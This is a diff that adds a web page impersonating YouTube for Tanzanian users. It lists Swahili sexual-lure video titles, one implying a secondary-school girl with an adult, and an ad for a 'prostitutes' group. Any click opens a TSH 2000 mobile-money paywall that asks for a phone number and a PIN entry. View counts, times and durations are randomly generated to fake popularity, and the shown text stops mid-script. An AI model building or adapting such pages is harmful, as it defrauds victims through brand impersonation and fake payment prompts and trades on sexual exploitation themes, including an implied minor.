@@ -1,0 +1,1561 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube - Tanzania</title>
+    <!-- Bootstrap 5 CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Bootstrap Icons -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet">
+    <!-- SweetAlert2 CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "Roboto", -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+            background-color: #0f0f0f;
+            color: #fff;
+        }
+
+        /* YouTube Header */
+        .youtube-header {
+            background: #0f0f0f;
+            padding: 8px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #3a3a3a;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .hamburger {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 20px;
+            padding: 8px;
+            cursor: pointer;
+            border-radius: 50%;
+        }
+
+        .hamburger:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .youtube-logo {
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .search-section {
+            flex: 1;
+            max-width: 640px;
+            margin: 0 40px;
+            display: flex;
+            align-items: center;
+        }
+
+        .search-container {
+            display: flex;
+            width: 100%;
+        }
+
+        .search-input {
+            flex: 1;
+            background: #121212;
+            border: 1px solid #303030;
+            color: white;
+            padding: 8px 12px;
+            font-size: 16px;
+            border-radius: 40px 0 0 40px;
+            outline: none;
+        }
+
+        .search-input:focus {
+            border-color: #1c62b9;
+        }
+
+        .search-btn {
+            background: #303030;
+            border: 1px solid #303030;
+            border-left: none;
+            color: #aaa;
+            padding: 8px 20px;
+            border-radius: 0 40px 40px 0;
+            cursor: pointer;
+        }
+
+        .search-btn:hover {
+            background: #404040;
+        }
+
+        .user-section {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .icon-btn {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 20px;
+            padding: 8px;
+            cursor: pointer;
+            border-radius: 50%;
+        }
+
+        .icon-btn:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        /* Main Content */
+        .main-container {
+            display: flex;
+            min-height: calc(100vh - 56px);
+        }
+
+        .sidebar {
+            width: 240px;
+            background: #0f0f0f;
+            padding: 12px 0;
+            border-right: 1px solid #3a3a3a;
+            position: sticky;
+            top: 56px;
+            height: calc(100vh - 56px);
+            overflow-y: auto;
+        }
+
+        .sidebar-item {
+            display: flex;
+            align-items: center;
+            padding: 10px 24px;
+            color: white;
+            text-decoration: none;
+            transition: background-color 0.2s;
+        }
+
+        .sidebar-item:hover {
+            background: #272727;
+            color: white;
+        }
+
+        .sidebar-item.active {
+            background: #272727;
+        }
+
+        .sidebar-item i {
+            font-size: 20px;
+            margin-right: 24px;
+            width: 24px;
+            text-align: center;
+        }
+
+        .content-area {
+            flex: 1;
+            padding: 20px 24px;
+        }
+
+        /* Video Grid */
+        .video-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 16px;
+            max-width: 1400px;
+        }
+
+        /* Prevent layout shifts when modal opens */
+        body.modal-open {
+            overflow: hidden;
+            padding-right: 0 !important;
+        }
+
+        .video-card {
+            cursor: pointer;
+            transition: transform 0.2s;
+            position: relative;
+            width: 100%;
+            min-height: 250px;
+        }
+
+        .video-card:hover {
+            transform: scale(1.02);
+        }
+
+        .video-card:active {
+            transform: scale(0.98);
+        }
+
+        /* Ensure video cards maintain size when modal is open */
+        .modal-open .video-card {
+            transform: none !important;
+            width: 100% !important;
+            min-height: 250px !important;
+        }
+
+        .modal-open .video-grid {
+            pointer-events: none;
+        }
+
+        .modal-open .video-thumbnail {
+            width: 100% !important;
+            aspect-ratio: 16/9 !important;
+        }
+
+        .modal-open .video-info {
+            width: 100% !important;
+            padding: 12px 0 !important;
+        }
+
+        .video-thumbnail {
+            position: relative;
+            width: 100%;
+            aspect-ratio: 16/9;
+            border-radius: 12px;
+            overflow: hidden;
+            background: #333;
+        }
+
+        .video-thumbnail img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            background: #333;
+            transition: opacity 0.3s;
+        }
+
+        .video-thumbnail img:not(.loaded) {
+            opacity: 0;
+        }
+
+        .video-thumbnail img.loaded {
+            opacity: 1;
+        }
+
+        .thumbnail-loading {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #aaa;
+            font-size: 14px;
+        }
+
+        .loading-placeholder {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, #333 25%, #444 50%, #333 75%);
+            background-size: 200% 100%;
+            animation: loading 1.5s infinite;
+        }
+
+        @keyframes loading {
+            0% {
+                background-position: 200% 0;
+            }
+
+            100% {
+                background-position: -200% 0;
+            }
+        }
+
+        .video-duration {
+            position: absolute;
+            bottom: 8px;
+            right: 8px;
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 500;
+        }
+
+        .video-info {
+            padding: 12px 0;
+        }
+
+        .video-title {
+            font-size: 16px;
+            font-weight: 500;
+            line-height: 1.3;
+            margin-bottom: 4px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+        }
+
+        .video-meta {
+            color: #aaa;
+            font-size: 14px;
+            line-height: 1.3;
+        }
+
+        .channel-name {
+            color: #aaa;
+            margin-bottom: 2px;
+        }
+
+        .video-stats {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        /* Modal Styles */
+        #loadingOverlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.8);
+            z-index: 9999;
+        }
+
+        #loadingSpinner {
+            display: block;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: translate(-50%, -50%) rotate(0deg);
+            }
+
+            100% {
+                transform: translate(-50%, -50%) rotate(360deg);
+            }
+        }
+
+        .btn-loading-spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid transparent;
+            border-top: 2px solid #ffffff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        #loadingButton {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 48px;
+            padding-top: 8px;
+        }
+
+        .toast-notification {
+            position: fixed;
+            top: 20px;
+            right: -350px;
+            width: 320px;
+            background: white;
+            color: #333;
+            padding: 16px 20px;
+            border-radius: 12px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15);
+            z-index: 10000;
+            transition: all 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            border-left: 4px solid #28a745;
+        }
+
+        .toast-notification.show {
+            right: 20px;
+        }
+
+        .toast-notification .toast-content {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .toast-notification .toast-icon {
+            font-size: 24px;
+            color: #28a745;
+        }
+
+        .toast-notification .toast-text {
+            flex: 1;
+        }
+
+        .toast-notification .toast-title {
+            font-weight: 600;
+            font-size: 16px;
+            margin-bottom: 4px;
+        }
+
+        .toast-notification .toast-message {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        .payment-instructions {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .payment-instructions-spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #28a745;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px auto;
+        }
+
+        .payment-instructions .instruction-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 16px;
+            padding: 12px;
+            background: rgba(40, 167, 69, 0.1);
+            border-radius: 8px;
+            border-left: 4px solid #28a745;
+        }
+
+        .payment-instructions .instruction-icon {
+            font-size: 24px;
+            margin-right: 16px;
+            color: #28a745;
+        }
+
+        .payment-instructions .instruction-text {
+            text-align: left;
+            font-size: 15px;
+            color: #333;
+        }
+
+        .payment-instructions .loading-dots {
+            display: inline-block;
+            position: relative;
+            width: 64px;
+            height: 16px;
+        }
+
+        .payment-instructions .loading-dots div {
+            position: absolute;
+            top: 6px;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #28a745;
+            animation-timing-function: cubic-bezier(0, 1, 1, 0);
+        }
+
+        .payment-instructions .loading-dots div:nth-child(1) {
+            left: 6px;
+            animation: lds-ellipsis1 0.6s infinite;
+        }
+
+        .payment-instructions .loading-dots div:nth-child(2) {
+            left: 6px;
+            animation: lds-ellipsis2 0.6s infinite;
+        }
+
+        .payment-instructions .loading-dots div:nth-child(3) {
+            left: 26px;
+            animation: lds-ellipsis2 0.6s infinite;
+        }
+
+        .payment-instructions .loading-dots div:nth-child(4) {
+            left: 45px;
+            animation: lds-ellipsis3 0.6s infinite;
+        }
+
+        @keyframes lds-ellipsis1 {
+            0% {
+                transform: scale(0);
+            }
+
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        @keyframes lds-ellipsis3 {
+            0% {
+                transform: scale(1);
+            }
+
+            100% {
+                transform: scale(0);
+            }
+        }
+
+        @keyframes lds-ellipsis2 {
+            0% {
+                transform: translate(0, 0);
+            }
+
+            100% {
+                transform: translate(19px, 0);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .sidebar {
+                display: none;
+            }
+
+            .youtube-header {
+                padding: 6px 8px;
+                gap: 8px;
+            }
+
+            .logo-section {
+                gap: 8px;
+                min-width: fit-content;
+            }
+
+            .youtube-logo {
+                font-size: 16px;
+                white-space: nowrap;
+            }
+
+            .hamburger {
+                font-size: 18px;
+                padding: 4px;
+                min-width: 32px;
+            }
+
+            .search-section {
+                margin: 0 4px;
+                flex: 1;
+                min-width: 0;
+            }
+
+            .search-container {
+                width: 100%;
+            }
+
+            .search-input {
+                font-size: 14px;
+                padding: 6px 8px;
+                min-width: 0;
+                flex: 1;
+            }
+
+            .search-btn {
+                padding: 6px 12px;
+                min-width: 40px;
+            }
+
+            .video-grid {
+                grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+                gap: 12px;
+            }
+
+            .content-area {
+                padding: 12px;
+            }
+
+            .video-title {
+                font-size: 14px;
+                line-height: 1.4;
+                -webkit-line-clamp: 3;
+            }
+
+            .video-meta {
+                font-size: 13px;
+            }
+
+            .video-duration {
+                font-size: 11px;
+                padding: 2px 4px;
+            }
+
+            .user-section {
+                gap: 2px;
+                min-width: fit-content;
+            }
+
+            .icon-btn {
+                font-size: 16px;
+                padding: 4px;
+                min-width: 32px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .youtube-header {
+                padding: 4px 6px;
+                gap: 4px;
+            }
+
+            .logo-section {
+                gap: 4px;
+            }
+
+            .youtube-logo {
+                font-size: 14px;
+            }
+
+            .hamburger {
+                font-size: 16px;
+                padding: 2px;
+                min-width: 28px;
+            }
+
+            .search-section {
+                margin: 0 2px;
+                max-width: none;
+                flex: 1;
+            }
+
+            .search-input {
+                padding: 4px 6px;
+                font-size: 14px;
+            }
+
+            .search-btn {
+                padding: 4px 8px;
+                min-width: 36px;
+            }
+
+            .search-btn i {
+                font-size: 14px;
+            }
+
+            .video-grid {
+                grid-template-columns: 1fr;
+                gap: 16px;
+            }
+
+            .content-area {
+                padding: 8px;
+            }
+
+            .video-card {
+                max-width: 100%;
+            }
+
+            .video-thumbnail {
+                border-radius: 8px;
+            }
+
+            .video-title {
+                font-size: 15px;
+                line-height: 1.3;
+                margin-bottom: 6px;
+            }
+
+            .video-info {
+                padding: 10px 0;
+            }
+
+            .user-section {
+                gap: 1px;
+            }
+
+            .user-section .icon-btn {
+                font-size: 14px;
+                padding: 2px;
+                min-width: 28px;
+            }
+
+            .user-section .icon-btn:nth-child(1) {
+                display: none;
+                /* Hide video icon on small screens */
+            }
+
+            /* Make modal more mobile friendly */
+            .modal-dialog {
+                margin: 8px;
+            }
+
+            .modal-content {
+                border-radius: 12px;
+            }
+
+            .modal-body {
+                padding: 20px !important;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .youtube-header {
+                padding: 2px 4px;
+                gap: 2px;
+            }
+
+            .logo-section {
+                gap: 2px;
+            }
+
+            .youtube-logo {
+                font-size: 12px;
+            }
+
+            .hamburger {
+                font-size: 14px;
+                padding: 1px;
+                min-width: 24px;
+            }
+
+            .search-section {
+                margin: 0 1px;
+            }
+
+            .search-input {
+                padding: 2px 4px;
+                font-size: 12px;
+            }
+
+            .search-btn {
+                padding: 2px 6px;
+                min-width: 32px;
+            }
+
+            .search-btn i {
+                font-size: 12px;
+            }
+
+            .user-section .icon-btn {
+                font-size: 12px;
+                padding: 1px;
+                min-width: 24px;
+            }
+
+            .user-section .icon-btn:nth-child(2) {
+                display: none;
+                /* Hide bell icon on very small screens */
+            }
+
+            .video-grid {
+                gap: 12px;
+            }
+
+            .content-area {
+                padding: 6px;
+            }
+
+            .video-title {
+                font-size: 14px;
+            }
+
+            .video-meta {
+                font-size: 12px;
+            }
+        }
+
+        /* Touch-friendly improvements */
+        @media (hover: none) and (pointer: coarse) {
+            .video-card:hover {
+                transform: none;
+                /* Disable hover effects on touch devices */
+            }
+
+            .video-card:active {
+                transform: scale(0.98);
+                background: rgba(255, 255, 255, 0.05);
+                border-radius: 12px;
+            }
+
+            .sidebar-item:hover {
+                background: none;
+            }
+
+            .control-btn:hover,
+            .icon-btn:hover,
+            .hamburger:hover {
+                background: none;
+            }
+        }
+
+        /* Landscape mode on mobile */
+        @media (max-width: 768px) and (orientation: landscape) {
+            .video-grid {
+                grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+                gap: 10px;
+            }
+
+            .content-area {
+                padding: 10px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Toast Notification -->
+    <div id="toastNotification" class="toast-notification">
+        <div class="toast-content">
+            <i class="bi bi-check-circle-fill toast-icon"></i>
+            <div class="toast-text">
+                <div class="toast-title">Payment Created!</div>
+                <div class="toast-message">Order ID generated successfully</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- YouTube Header -->
+    <header class="youtube-header">
+        <div class="logo-section">
+            <button class="hamburger">
+                <i class="bi bi-list"></i>
+            </button>
+            <a href="#" class="youtube-logo">
+                <i class="bi bi-youtube" style="color: #ff0000; margin-right: 4px;"></i>
+                YouTube X
+            </a>
+        </div>
+
+        <div class="search-section">
+            <div class="search-container">
+                <input type="text" class="search-input" placeholder="Search">
+                <button class="search-btn">
+                    <i class="bi bi-search"></i>
+                </button>
+            </div>
+        </div>
+
+        <div class="user-section">
+            <button class="icon-btn">
+                <i class="bi bi-camera-video"></i>
+            </button>
+            <button class="icon-btn">
+                <i class="bi bi-bell"></i>
+            </button>
+            <button class="icon-btn">
+                <i class="bi bi-person-circle"></i>
+            </button>
+        </div>
+    </header>
+
+    <!-- Main Container -->
+    <div class="main-container">
+        <!-- Sidebar -->
+        <nav class="sidebar">
+            <a href="#" class="sidebar-item active">
+                <i class="bi bi-house-door"></i>
+                Home
+            </a>
+            <a href="#" class="sidebar-item">
+                <i class="bi bi-compass"></i>
+                Explore
+            </a>
+            <a href="#" class="sidebar-item">
+                <i class="bi bi-collection-play"></i>
+                Subscriptions
+            </a>
+            <a href="#" class="sidebar-item">
+                <i class="bi bi-folder"></i>
+                Library
+            </a>
+            <a href="#" class="sidebar-item">
+                <i class="bi bi-clock-history"></i>
+                History
+            </a>
+            <a href="#" class="sidebar-item">
+                <i class="bi bi-play-circle"></i>
+                Your videos
+            </a>
+            <a href="#" class="sidebar-item">
+                <i class="bi bi-clock"></i>
+                Watch later
+            </a>
+            <a href="#" class="sidebar-item">
+                <i class="bi bi-hand-thumbs-up"></i>
+                Liked videos
+            </a>
+        </nav>
+
+        <!-- Content Area -->
+        <main class="content-area">
+            <div class="video-grid" id="videoGrid">
+                <!-- Videos will be generated by JavaScript -->
+            </div>
+        </main>
+    </div>
+
+    <!-- Modal -->
+    <div class="modal fade" id="downloadModal" tabindex="-1" aria-labelledby="payModalLabel" aria-hidden="true"
+        data-bs-backdrop="static">
+        <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content rounded-4">
+                <div class="modal-body p-4">
+                    <div id="loadingOverlay">
+                        <div id="loadingSpinner"></div>
+                    </div>
+
+
+                    <div id="defaultContent">
+                        <h4 class="fw-bold text-dark text-center mb-3">Lipia TSH 2000/= Kuendelea</h4>
+                        <p class="text-muted small text-center">Ujiunge Na Group la connection zote Group la malaya wote
+                            TZ Connection zote zipo</p>
+
+                        <form id="paymentForm">
+                            <label for="phone" class="form-label text-dark fw-semibold">Namba ya simu yenye hela</label>
+                            <input type="text" name="phone" id="phone" class="form-control mb-3"
+                                placeholder="Jaza namba ya simu" required>
+
+                            <div class="d-flex justify-content-between align-items-center bg-light p-2 rounded mb-3"
+                                style="cursor: pointer;">
+                                <img src="pay.png" alt="Payment Methods" class="img-fluid" style="max-height: 25px;">
+                                <span class="fw-bold text-primary fs-5">Tsh 2000</span>
+                            </div>
+                            <input type="hidden" name="name" id="name" value="Customer">
+                            <input class="form-check-input" type="hidden" name="package" id="package3" value="2000"
+                                required>
+
+                            <button type="submit" id="payButton" class="btn w-100 fw-bold" style="
+                                border-radius: 12px;
+                                padding: 12px 0;
+                                background: linear-gradient(to right, #27aa4c, #20c691);
+                                color: white;
+                                border: none;
+                            ">
+                                LIPIA
+                            </button>
+
+                            <div id="loadingButton" class="btn w-100 fw-bold" style="
+                                border-radius: 12px;
+                                background: linear-gradient(to right, #27aa4c, #20c691);
+                                color: white;
+                                border: none;
+                                display: none;
+                            ">
+                                <div class="btn-loading-spinner"></div>
+                            </div>
+                        </form>
+                    </div>
+
+                    <!-- Payment Instructions Content -->
+                    <div id="paymentInstructions" class="payment-instructions">
+                        <div class="payment-instructions-spinner"></div>
+                        <h4 class="fw-bold text-center mb-4" style="color: #28a745;">Endelea kulipia...</h4>
+                        <p class="text-center mb-4" style="color: #666; font-size: 16px;">Tafashali Kamilisha malipo kwa
+                            simu yako</p>
+
+                        <div class="instruction-item">
+                            <span class="instruction-icon">📱</span>
+                            <span class="instruction-text">Check your phone for USSD prompt</span>
+                        </div>
+
+                        <div class="instruction-item">
+                            <span class="instruction-icon">💳</span>
+                            <span class="instruction-text">Enter your PIN to complete payment</span>
+                        </div>
+
+                        <div class="instruction-item">
+                            <span class="instruction-icon">⏳</span>
+                            <span class="instruction-text">Waiting for confirmation
+                                <div class="loading-dots">
+                                    <div></div>
+                                    <div></div>
+                                    <div></div>
+                                    <div></div>
+                                </div>
+                            </span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+    <!-- SweetAlert2 JS -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.all.min.js"></script>
+
+    <script>
+        // Video data with all your thumbnails
+        const videos = [
+            {
+                thumbnail: "https://upload255.xyz/uploads/68d08a68649a2_Screenshot%202025-09-21%20162132.png",
+                title: "Mdada wa Shule ya Sekondari Akiwa na Mtu Mzima",
+                channel: "TZ Entertainment",
+                views: "234K",
+                timeAgo: "2 siku zilizopita",
+                duration: "8:45"
+            },
+            {
+                thumbnail: "https://upload255.xyz/uploads/68d08a5fbf53f_Screenshot%202025-09-21%20162224.png",
+                title: "Malaya wa Dar es Salaam - Video ya Kutisha",
+                channel: "Habari za Mitaani",
+                views: "156K",
+                timeAgo: "4 masaa yaliyopita",
+                duration: "12:33"
+            },
+            {
+                thumbnail: "https://upload255.xyz/uploads/68d08a4f08b8b_Screenshot%202025-09-21%20162252.png",
+                title: "Wanawake wa Kimataifa Wakitumia Dawa za Kienyeji",
+                channel: "Afrika TV",
+                views: "89K",
+                timeAgo: "1 siku iliyopita",
+                duration: "6:21"
+            },
+            {
+                thumbnail: "https://upload255.xyz/uploads/68d08a45ce5be_Screenshot%202025-09-21%20162340.png",
+                title: "Msichana Mkubwa Akivuta Sigara na Kunywa Pombe",
+                channel: "Street Stories",
+                views: "345K",
+                timeAgo: "3 siku zilizopita",
+                duration: "9:17"
+            },
+            {
+                thumbnail: "https://upload255.xyz/uploads/68d08a3d4f574_Screenshot%202025-09-21%20162419.png",
+                title: "Wamama wa Kigoma Wakijadili Mapenzi",
+                channel: "Mambo Leo",
+                views: "67K",
+                timeAgo: "6 masaa yaliyopita",
+                duration: "15:42"
+            },
+            {
+                thumbnail: "https://upload255.xyz/uploads/68d08a33f03ae_Screenshot%202025-09-21%20162520.png",
+                title: "Vijana wa Mwanza Wakicheza Ngoma za Kizazi Kipya",
+                channel: "East Africa Vibes",
+                views: "178K",
+                timeAgo: "12 masaa yaliyopita",
+                duration: "7:55"
+            },
+            {
+                thumbnail: "https://upload255.xyz/uploads/68d08a2803d68_Screenshot%202025-09-21%20162553.png",
+                title: "Mama Mdogo Akiongea na Mpeni Wake",
+                channel: "TZ Real Talk",
+                views: "290K",
+                timeAgo: "2 siku zilizopita",
+                duration: "11:28"
+            },
+            {
+                thumbnail: "https://upload255.xyz/uploads/68d08a0b5a210_Screenshot%202025-09-21%20162727.png",
+                title: "Wasichana wa Chuo Kikuu Wakifanya Mambo",
+                channel: "Campus Life TZ",
+                views: "445K",
+                timeAgo: "5 siku zilizopita",
+                duration: "13:16"
+            },
+            {
+                thumbnail: "https://upload255.xyz/uploads/68d08a14e1551_Screenshot%202025-09-21%20162702.png",
+                title: "Bibi Harusi Akiwa na Rafiki Yake wa Kiume",
+                channel: "Scandal TV",
+                views: "567K",
+                timeAgo: "1 wiki iliyopita",
+                duration: "10:03"
+            },
+            {
+                thumbnail: "https://upload255.xyz/uploads/68d08a1ec28dc_Screenshot%202025-09-21%20162625.png",
+                title: "Wanawake wa Arusha Wakizungumza Mazito",
+                channel: "Northern Zone",
+                views: "123K",
+                timeAgo: "3 masaa yaliyopita",
+                duration: "8:39"
+            },
+            {
+                thumbnail: "https://upload255.xyz/uploads/68d17c8307f52_Screenshot%202025-09-22%20092926.png",
+                title: "Mrembo wa Dodoma Akiongea na Marafiki",
+                channel: "Capital Stories",
+                views: "234K",
+                timeAgo: "8 masaa yaliyopita",
+                duration: "14:22"
+            },
+            {
+                thumbnail: "https://upload255.xyz/uploads/68d17cb96be17_Screenshot%202025-09-22%20093000.png",
+                title: "Dada Mkubwa Akitoa Mafunzo ya Maisha",
+                channel: "Life Lessons TZ",
+                views: "78K",
+                timeAgo: "2 siku zilizopita",
+                duration: "9:44"
+            },
+            {
+                thumbnail: "https://upload255.xyz/uploads/68d17cd90c69a_Screenshot%202025-09-22%20093040.png",
+                title: "Msichana wa Kisasa Akivaa Nguo za Harusi",
+                channel: "Fashion TZ",
+                views: "156K",
+                timeAgo: "4 siku zilizopita",
+                duration: "6:18"
+            },
+            {
+                thumbnail: "https://upload255.xyz/uploads/68d17cfc7ef77_Screenshot%202025-09-22%20093212.png",
+                title: "Mama Mzuri Akiimba Nyimbo za Kigoma",
+                channel: "Music Tanzania",
+                views: "89K",
+                timeAgo: "1 siku iliyopita",
+                duration: "12:07"
+            },
+            {
+                thumbnail: "https://upload255.xyz/uploads/68d17d1e23b7c_Screenshot%202025-09-22%20093324.png",
+                title: "Wanawake Wazuri wa Pwani Wakicheza",
+                channel: "Coastal Vibes",
+                views: "267K",
+                timeAgo: "6 siku zilizopita",
+                duration: "7:33"
+            },
+            {
+                thumbnail: "https://upload255.xyz/uploads/68d17d3c16a29_Screenshot%202025-09-22%20093518.png",
+                title: "Msichana Mkubwa Akiwa na Shangazi Yake",
+                channel: "Family Matters",
+                views: "345K",
+                timeAgo: "3 masaa yaliyopita",
+                duration: "16:45"
+            },
+            {
+                thumbnail: "https://upload255.xyz/uploads/68d17d6ab0e64_Screenshot%202025-09-22%20093630.png",
+                title: "Dada za Mbeya Wakiongea Mazito Sana",
+                channel: "Highlands TV",
+                views: "198K",
+                timeAgo: "1 wiki iliyopita",
+                duration: "11:56"
+            },
+            {
+                thumbnail: "https://upload255.xyz/uploads/68d17d8220128_Screenshot%202025-09-22%20093719.png",
+                title: "Mama Mdogo Akiwa na Kijana Mrefu",
+                channel: "Real Stories TZ",
+                views: "456K",
+                timeAgo: "5 masaa yaliyopita",
+                duration: "8:24"
+            },
+            {
+                thumbnail: "https://upload255.xyz/uploads/68d17d9e3ea46_Screenshot%202025-09-22%20093804.png",
+                title: "Wasichana wa Morogoro Wakifanya Mchezo",
+                channel: "Eastern Zone",
+                views: "123K",
+                timeAgo: "2 siku zilizopita",
+                duration: "13:41"
+            },
+            {
+                thumbnail: "https://upload255.xyz/uploads/68d17dc19a8b1_Screenshot%202025-09-22%20093912.png",
+                title: "Bibi Mzuri Akiongea na Watoto Wake",
+                channel: "Motherhood TZ",
+                views: "234K",
+                timeAgo: "4 siku zilizopita",
+                duration: "9:18"
+            },
+            {
+                thumbnail: "https://upload255.xyz/uploads/68d17ddcac46f_Screenshot%202025-09-22%20094043.png",
+                title: "Mschana wa Kisasa Akivaa Mavazi Mapya",
+                channel: "Style Tanzania",
+                views: "167K",
+                timeAgo: "7 masaa yaliyopita",
+                duration: "6:52"
+            },
+            {
+                thumbnail: "https://upload255.xyz/uploads/68d17df805ece_Screenshot%202025-09-22%20094154.png",
+                title: "Mama Mkubwa Akitoa Ushauri wa Mapenzi",
+                channel: "Love Advice TZ",
+                views: "389K",
+                timeAgo: "1 wiki iliyopita",
+                duration: "15:27"
+            }
+        ];
+
+        // Shuffle array function
+        function shuffleArray(array) {
+            for (let i = array.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [array[i], array[j]] = [array[j], array[i]];
+            }
+            return array;
+        }
+
+        // Generate random data for variety
+        function getRandomViews() {
+            const views = Math.floor(Math.random() * 1000) + 50;
+            return views + 'K';
+        }
+
+        function getRandomTime() {
+            const times = [
+                "2 masaa yaliyopita", "4 masaa yaliyopita", "6 masaa yaliyopita", "8 masaa yaliyopita",
+                "1 siku iliyopita", "2 siku zilizopita", "3 siku zilizopita", "4 siku zilizopita",
+                "1 wiki iliyopita", "2 wiki zilizopita", "1 mwezi uliopita"
+            ];
+            return times[Math.floor(Math.random() * times.length)];
+        }
+
+        function getRandomDuration() {
+            const minutes = Math.floor(Math.random() * 15) + 3;
+            const seconds = Math.floor(Math.random() * 60);
+            return `${minutes}:${seconds.toString().padStart(2, '0')}`;
+        }
+
+        // Initialize modal
+        const downloadModalEl = document.getElementById('downloadModal');
+        const downloadModal = new bootstrap.Modal(downloadModalEl);
+
+        // Simple and reliable image loading with basic caching
+        const imageCache = new Map();
+
+        function loadImageOptimized(imgElement, url, loadingPlaceholder, loadingText) {
+            // Check if image is already cached
+            if (imageCache.has(url)) {
+                imgElement.src = url;
+                loadingPlaceholder.style.display = 'none';
+                loadingText.style.display = 'none';
+                imgElement.style.display = 'block';
+                imgElement.classList.add('loaded');
+                return;
+            }
+
+
+            const preloadImg = new Image();
+
+            preloadImg.onload = function () {
+
+                imageCache.set(url, true);
+
+                imgElement.src = url;
+                loadingPlaceholder.style.display = 'none';
+                loadingText.style.display = 'none';
+                imgElement.style.display = 'block';
+                imgElement.classList.add('loaded');
+            };
+
+            preloadImg.onerror = function () {
+
+                loadingPlaceholder.style.display = 'none';
+                loadingText.style.display = 'none';
+                imgElement.style.display = 'block';
+                imgElement.style.backgroundColor = '#333';
+                imgElement.style.background = 'linear-gradient(45deg, #333 25%, #444 25%, #444 50%, #333 50%, #333 75%, #444 75%, #444)';
+                imgElement.style.backgroundSize = '20px 20px';
+                imgElement.alt = 'Image unavailable';
+            };
+
+
+            preloadImg.src = url;
+        }
+
+
+        function generateVideoGrid() {
+            const videoGrid = document.getElementById('videoGrid');
+            const shuffledVideos = shuffleArray([...videos]);
+
+            shuffledVideos.forEach((video, index) => {
+                const videoCard = document.createElement('div');
+                videoCard.className = 'video-card';
+                videoCard.onclick = () => openModal();
+
+                const thumbnailId = `thumbnail-${index}`;
+                const duration = getRandomDuration();
+
+                videoCard.innerHTML = `
+                    <div class="video-thumbnail">
+                        <div class="loading-placeholder" id="loading-${index}"></div>
+                        <div class="thumbnail-loading" id="loading-text-${index}">Loading...</div>
+                        <img id="${thumbnailId}" src="" alt="${video.title}" style="display: none;">
+                        <div class="video-duration">${duration}</div>
+                    </div>
+                    <div class="video-info">
+                        <div class="video-title">${video.title}</div>
+                        <div class="video-meta">
+                            <div class="channel-name">${video.channel}</div>
+                            <div class="video-stats">
+                                <span>${getRandomViews()} views</span>
+                                <span>•</span>
+                                <span>${getRandomTime()}</span>
+                            </div>
+                        </div>
+                    </div>
+                `;
+
+                videoGrid.appendChild(videoCard);
+
+                const img = document.getElementById(thumbnailId);
